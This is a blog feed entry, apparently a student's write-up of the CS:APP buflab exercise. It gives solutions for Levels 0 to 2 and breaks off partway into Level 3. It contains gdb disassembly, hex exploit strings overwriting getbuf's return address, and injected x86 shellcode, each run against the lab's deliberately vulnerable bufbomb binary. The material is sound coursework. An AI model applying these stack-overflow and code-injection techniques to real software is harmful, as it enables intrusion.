<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Code Play</title>
  <icon>https://www.gravatar.com/avatar/37f5042e32043c8bcdfe0a7b75ed5267</icon>
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-09-08T15:16:31.677Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>南懿烨曦</name>
    <email>869083577@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>buflab-计算机系统实验</title>
    <link href="http://example.com/2022/09/08/buflab-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/"/>
    <id>http://example.com/2022/09/08/buflab-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/</id>
    <published>2022-09-08T15:12:26.000Z</published>
    <updated>2022-09-08T15:16:31.677Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0-查看cookie"><a href="#0-查看cookie" class="headerlink" title="0. 查看cookie"></a><strong>0. 查看cookie</strong></h1> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ ./makecookie 202026010521</span><br><span class="line">0x685c1d96</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="1-Level0-Candle-10-pts"><a href="#1-Level0-Candle-10-pts" class="headerlink" title="1.Level0: Candle (10 pts)"></a><strong>1.Level0: Candle (10 pts)</strong></h1><p>Your task is to get BUFBOMB to execute the code forsmoke when getbuf executes its return statement,rather than returning to test.Note that your exploit string may also corrupt parts of the stack notdirectlyrelated to this stage, but this will not cause a problem, since smokecauses the program to exit directly.</p><p>题意解析：这里就是要让test运行完后，不直接返回退出。而是跳到smoke函数处，继续运行，而当smoke运行完毕后，才退出。</p><p>源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NORMAL_BUFFER_SIZE 32</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="comment">/* Put canary on stack to detect possiblecorruption */</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> local = uniqueval();</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="comment">/* Check for corruption stack */</span></span><br><span class="line">    <span class="keyword">if</span> (local != uniqueval())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sabotaged!: the stack has beencorrupted\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (val == cookie)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Boom!: getbuf returned0x%x\n&quot;</span>, val);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Dud: getbuf returned0x%x\n&quot;</span>, val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[NORMAL_BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Smoke源码：</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">smoke</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Smoke!: You calledsmoke()&quot;</span>);</span><br><span class="line">    validate(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p><img src="https://img-blog.csdnimg.cn/31da264d8cc84f249b4ac64a317d7aa5.png#pic_center" alt="在这里插入图片描述"></p><p>Gets()函数用来获取数据到缓冲区，而Gets()函数不会对输入的数据进行边界检查。所以当我们的输入超过了缓冲区的大小（这里是32）时，超过缓冲区的数据就会覆盖内存中用作其它用途的数据，从而改变程序的行为。</p><p>要运行smoke()函数，只需要将buf区的内容冲到返回地址即可，这样原本应该返回到test()函数的地址被修改为了smoke()函数的地址</p><p>查看getbuf()汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ gdb -q bufbomb</span><br><span class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</span><br><span class="line">(gdb) disassemble getbuf</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x08049262 &lt;+0&gt;:push   %ebp</span><br><span class="line">   0x08049263 &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line">   0x08049265 &lt;+3&gt;:sub    $0x38,%esp</span><br><span class="line">   0x08049268 &lt;+6&gt;:lea    -0x28(%ebp),%eax</span><br><span class="line">   0x0804926b &lt;+9&gt;:mov    %eax,(%esp)</span><br><span class="line">   0x0804926e &lt;+12&gt;:call   0x8048c32 &lt;Gets&gt;</span><br><span class="line">   0x08049273 &lt;+17&gt;:mov    $0x1,%eax</span><br><span class="line">   0x08049278 &lt;+22&gt;:leave  </span><br><span class="line">   0x08049279 &lt;+23&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现buf缓冲区大小为0x28，加上ebp所指空间，则到达返回地址空间，故答案中的前44个字节可以任意填写（由于Gets是通过换行符\n（ASCII值0x0a）界定输入终止的，所以前44字节只要不是0a就可以），最后四个字节填写smoke()函数的地址</p><p>查看smoke()函数的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble smoke </span><br><span class="line">Dump of assembler code for function smoke:</span><br><span class="line">   0x08048e0a &lt;+0&gt;:push   %ebp</span><br><span class="line">   0x08048e0b &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line">   0x08048e0d &lt;+3&gt;:sub    $0x18,%esp</span><br><span class="line">   0x08048e10 &lt;+6&gt;:movl   $0x804a2fe,0x4(%esp)</span><br><span class="line">   0x08048e18 &lt;+14&gt;:movl   $0x1,(%esp)</span><br><span class="line">   0x08048e1f &lt;+21&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x08048e24 &lt;+26&gt;:movl   $0x0,(%esp)</span><br><span class="line">   0x08048e2b &lt;+33&gt;:call   0x8049280 &lt;validate&gt;</span><br><span class="line">   0x08048e30 &lt;+38&gt;:movl   $0x0,(%esp)</span><br><span class="line">   0x08048e37 &lt;+45&gt;:call   0x80488d0 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>地址为0x08048e0a,可以看到地址中有0a，查阅资料可知0a对应的ASCII码为换行符，写入会出错。可以看到smoke()最后有调用一个exit()函数，即直接退出程序，不再返回到原函数，所以smoke()函数的第一条汇编码可以忽略(此汇编码表示存储test()函数栈底esp的地址)，所以我们选择0x08048e0b</p><h5 id="答案及结果"><a href="#答案及结果" class="headerlink" title="答案及结果"></a>答案及结果</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">./0.txt</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13</span><br><span class="line">0b 8e 04 08</span><br><span class="line"></span><br><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ ./hex2raw &lt; 0.txt | ./bufbomb -u 202026010521</span><br><span class="line">Userid: 202026010521</span><br><span class="line">Cookie: 0x685c1d96</span><br><span class="line">Type string:Smoke!: You called smoke()</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="2-Level1-Sparkler-10-pts"><a href="#2-Level1-Sparkler-10-pts" class="headerlink" title="2.Level1: Sparkler (10 pts)"></a>2.Level1: Sparkler (10 pts)</h1><p>Similar to Level 0, your task isto get BUFBOMB to execute the code for fizz rather than returningto test. In this case, however, you must make it appear to fizz as if you havepassed your cookie as its argument. How can you do this?</p><p>题意解析：</p><p>在level 0的基础上，使getbuf函数的返回指向fizz函数，同时将fizz函数的参数置为userid对应的cookie值。</p><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p>fizz()函数源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">fizz</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line"> <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Fizz!: You calledfizz(0x%x)\n&quot;</span>, val);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You calledfizz(0x%x)\n&quot;</span>, val);</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/31da264d8cc84f249b4ac64a317d7aa5.png#pic_center" alt="在这里插入图片描述"></p><p>查看fizz()函数的汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble fizz </span><br><span class="line">Dump of assembler code for function fizz:</span><br><span class="line">   0x08048daf &lt;+0&gt;:push   %ebp</span><br><span class="line">   0x08048db0 &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line">   0x08048db2 &lt;+3&gt;:sub    $0x18,%esp</span><br><span class="line">   0x08048db5 &lt;+6&gt;:mov    0x8(%ebp),%eax</span><br><span class="line">   0x08048db8 &lt;+9&gt;:cmp    0x804d104,%eax</span><br><span class="line">   0x08048dbe &lt;+15&gt;:jne    0x8048de6 &lt;fizz+55&gt;</span><br><span class="line">   0x08048dc0 &lt;+17&gt;:mov    %eax,0x8(%esp)</span><br><span class="line">   0x08048dc4 &lt;+21&gt;:movl   $0x804a2e0,0x4(%esp)</span><br><span class="line">   0x08048dcc &lt;+29&gt;:movl   $0x1,(%esp)</span><br><span class="line">   0x08048dd3 &lt;+36&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x08048dd8 &lt;+41&gt;:movl   $0x1,(%esp)</span><br><span class="line">   0x08048ddf &lt;+48&gt;:call   0x8049280 &lt;validate&gt;</span><br><span class="line">   0x08048de4 &lt;+53&gt;:jmp    0x8048dfe &lt;fizz+79&gt;</span><br><span class="line">   0x08048de6 &lt;+55&gt;:mov    %eax,0x8(%esp)</span><br><span class="line">   0x08048dea &lt;+59&gt;:movl   $0x804a4d4,0x4(%esp)</span><br><span class="line">   0x08048df2 &lt;+67&gt;:movl   $0x1,(%esp)</span><br><span class="line">   0x08048df9 &lt;+74&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x08048dfe &lt;+79&gt;:movl   $0x0,(%esp)</span><br><span class="line">   0x08048e05 &lt;+86&gt;:call   0x80488d0 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x08048dc0 &lt;+17&gt;:mov    %eax,0x8(%esp)</span><br></pre></td></tr></table></figure><p>这一步就是在取参数，正好取的就是第二个参数区的位置</p><p>在getbuf()的返回地址中存入fizz()函数的地址,返回地址上面的那个函数参数区存fizz()函数的返回地址，但由于fizz()函数根本不会返回，所以可以随意存，最上面的函数参数区存要传入的cookie参数</p><p>答案及结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">./1.txt</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13</span><br><span class="line">af 8d 04 08 //fizz()函数的地址</span><br><span class="line">11 11 11 11//fizz()函数的返回地址</span><br><span class="line">96 1d 5c 68 //cookie参数</span><br><span class="line"></span><br><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ ./hex2raw &lt; 1.txt | ./bufbomb -u 202026010521</span><br><span class="line">Userid: 202026010521</span><br><span class="line">Cookie: 0x685c1d96</span><br><span class="line">Type string:Fizz!: You called fizz(0x685c1d96)</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="3-Level2-Firecracker-15-pts"><a href="#3-Level2-Firecracker-15-pts" class="headerlink" title="3.Level2: Firecracker (15 pts)"></a>3.Level2: Firecracker (15 pts)</h1><p>Similar to Levels0 and 1, your task is to get BUFBOMB to execute the code for bang rather than returningto test. Before this, however, you must set global variable global_value toyour userid’s cookie. Your exploit code should set global_value, push theaddress of bang on the stack, and then execute a ret instruction to cause ajump to the code for bang.</p><p>题意解析：</p><p>令getbuf调用后不执行test函数，而是执行bang函数（默认会执行test函数），但是同时我们要修改global_value的值为cookie值。然而，global_value是一个全局变量，它没有储存再栈里面。所以在程序执行过程中，只能通过赋值语句来改变global_value的值。即这次我们不仅要让函数跳到bang中，而且要模拟一个函数调用来进行赋值。</p><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p>bang()函数源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> global_value =<span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">bang</span><span class="params">(<span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (global_value ==cookie) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Bang!:You set global_value to 0x%x\n&quot;</span>, global_value);</span><br><span class="line">validate(<span class="number">2</span>);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Misfire:global_value = 0x%x\n&quot;</span>, global_value);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/31da264d8cc84f249b4ac64a317d7aa5.png#pic_center" alt="在这里插入图片描述"></p><p>先假设我们已经有段攻击代码可以更改global_value的值，我们应该把这段攻击代码放在哪里？</p><p>答案是buf缓冲区，这里有很大一部分空间可以用来存放我们的攻击代码，返回地址存buf缓冲区的首地址，这样getbuf() return的时候会跑到buf缓冲区里面去，我们只需要将攻击代码加上一个返回指令，让代码执行结束后返回到bang()函数的位置，让程序继续运行bang()函数就ok</p><p>攻击代码需要实现的功能：</p><h5 id="1-更改global-val的值为cookie"><a href="#1-更改global-val的值为cookie" class="headerlink" title="1.更改global_val的值为cookie"></a>1.更改global_val的值为cookie</h5><h5 id="2-将bang-函数的地址作为返回地址压栈"><a href="#2-将bang-函数的地址作为返回地址压栈" class="headerlink" title="2.将bang()函数的地址作为返回地址压栈"></a>2.将bang()函数的地址作为返回地址压栈</h5><p>查看bang()函数的汇编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble bang </span><br><span class="line">Dump of assembler code for function bang:</span><br><span class="line">   0x08048d52 &lt;+0&gt;:push   %ebp</span><br><span class="line">   0x08048d53 &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line">   0x08048d55 &lt;+3&gt;:sub    $0x18,%esp</span><br><span class="line">   0x08048d58 &lt;+6&gt;:mov    0x804d10c,%eax</span><br><span class="line">   0x08048d5d &lt;+11&gt;:cmp    0x804d104,%eax</span><br><span class="line">   0x08048d63 &lt;+17&gt;:jne    0x8048d8b &lt;bang+57&gt;</span><br><span class="line">   0x08048d65 &lt;+19&gt;:mov    %eax,0x8(%esp)</span><br><span class="line">   0x08048d69 &lt;+23&gt;:movl   $0x804a4ac,0x4(%esp)</span><br><span class="line">   0x08048d71 &lt;+31&gt;:movl   $0x1,(%esp)</span><br><span class="line">   0x08048d78 &lt;+38&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x08048d7d &lt;+43&gt;:movl   $0x2,(%esp)</span><br><span class="line">   0x08048d84 &lt;+50&gt;:call   0x8049280 &lt;validate&gt;</span><br><span class="line">   0x08048d89 &lt;+55&gt;:jmp    0x8048da3 &lt;bang+81&gt;</span><br><span class="line">   0x08048d8b &lt;+57&gt;:mov    %eax,0x8(%esp)</span><br><span class="line">   0x08048d8f &lt;+61&gt;:movl   $0x804a2c2,0x4(%esp)</span><br><span class="line">   0x08048d97 &lt;+69&gt;:movl   $0x1,(%esp)</span><br><span class="line">   0x08048d9e &lt;+76&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x08048da3 &lt;+81&gt;:movl   $0x0,(%esp)</span><br><span class="line">   0x08048daa &lt;+88&gt;:call   0x80488d0 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到bang()函数的首地址为0x08048d52</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x08048d58 &lt;+6&gt;:mov    0x804d10c,%eax</span><br><span class="line">0x08048d5d &lt;+11&gt;:cmp    0x804d104,%eax</span><br></pre></td></tr></table></figure><p>这两段代码可以看出global_val的地址为0x804d10c,0x804d104存放的是cookie的值</p><p>故攻击代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl $0x685c1d96,%eax  //将cookie值存入eax寄存器</span><br><span class="line">movl %eax,0x804d104 //将eax中的（cookie）值存入global_value的地址</span><br><span class="line">pushl $0x08048d52  //将bang作为返回地址压栈 </span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>将其保存为2.s文件</p><p>接下来将汇编代码(2.s)转化成二进制文件(2.o)，并用objdump -d 命令查看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ as 2.s -o 2.o</span><br><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ objdump -d 2.o</span><br><span class="line"></span><br><span class="line">2.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:b8 96 1d 5c 68       mov    $0x685c1d96,%eax</span><br><span class="line">   5:a3 0c d1 04 08       mov    %eax,0x804d10c</span><br><span class="line">   a:68 52 8d 04 08       push   $0x8048d52</span><br><span class="line">   f:c3                   ret    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到有效攻击代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b8 96 1d 5c 68</span><br><span class="line">a3 0c d1 04 08</span><br><span class="line">68 52 8d 04 08</span><br><span class="line">c3 </span><br></pre></td></tr></table></figure><p>最后，查看buf缓冲区的首地址</p><p>查看getbuf()汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ gdb -q bufbomb</span><br><span class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</span><br><span class="line">(gdb) disassemble getbuf</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x08049262 &lt;+0&gt;:push   %ebp</span><br><span class="line">   0x08049263 &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line">   0x08049265 &lt;+3&gt;:sub    $0x38,%esp</span><br><span class="line">   0x08049268 &lt;+6&gt;:lea    -0x28(%ebp),%eax</span><br><span class="line">   0x0804926b &lt;+9&gt;:mov    %eax,(%esp)</span><br><span class="line">   0x0804926e &lt;+12&gt;:call   0x8048c32 &lt;Gets&gt;</span><br><span class="line">   0x08049273 &lt;+17&gt;:mov    $0x1,%eax</span><br><span class="line">   0x08049278 &lt;+22&gt;:leave  </span><br><span class="line">   0x08049279 &lt;+23&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x08049268 &lt;+6&gt;:lea    -0x28(%ebp),%eax</span><br><span class="line">0x0804926b &lt;+9&gt;:mov    %eax,(%esp)</span><br></pre></td></tr></table></figure><p>gdb调试，设置断点在0x0804926b，并查看寄存器eax即可得知buf首地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b *0x0804926b</span><br><span class="line">Breakpoint 1 at 0x804926b</span><br><span class="line">(gdb) r -u 202026010521</span><br><span class="line">Starting program: /home/lkl/桌面/计算机系统/buflab-handout/bufbomb -u 202026010521</span><br><span class="line">Userid: 202026010521</span><br><span class="line">Cookie: 0x685c1d96</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0804926b in getbuf ()</span><br><span class="line">(gdb) p/x $eax</span><br><span class="line"><span class="meta">$</span><span class="language-bash">1 = 0x55683848</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>buf首地址为0x55683848</p><h5 id="答案及结果-1"><a href="#答案及结果-1" class="headerlink" title="答案及结果"></a>答案及结果</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">./2.txt</span><br><span class="line">b8 96 1d 5c 68</span><br><span class="line">a3 0c d1 04 08</span><br><span class="line">68 52 8d 04 08</span><br><span class="line">c3 //攻击代码</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13 14 15 16 17 //填充代码</span><br><span class="line">48 38 68 55 //buff首地址</span><br><span class="line"></span><br><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ ./hex2raw &lt; 2.txt | ./bufbomb -u 202026010521</span><br><span class="line">Userid: 202026010521</span><br><span class="line">Cookie: 0x685c1d96</span><br><span class="line">Type string:Bang!: You set global_value to 0x685c1d96</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="4-Level-3-Dynamite-20-pts"><a href="#4-Level-3-Dynamite-20-pts" class="headerlink" title="4.Level 3: Dynamite (20 pts)"></a>4.Level 3: Dynamite (20 pts)</h1><p>Your job for thislevel is to supply an exploit string that will cause getbuf to return yourcookie back to test, rather than the value 1. You can see in the code for testthat this will cause the program to go“Boom!.” Your exploit code should set your cookie asthe return value, restore any corrupted state, push the correct return locationon the stack, and execute a ret instruction to really return to test.</p><p>题意解析：</p><p>这次要求getbuf调用后，返回到test当中，但是不能破坏为test函数维护的堆栈状态（test函数加了堆栈状态检测），同时要让test函数调用getbuf后的返回值（val）为自己的cookie。</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>test，getbuf源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 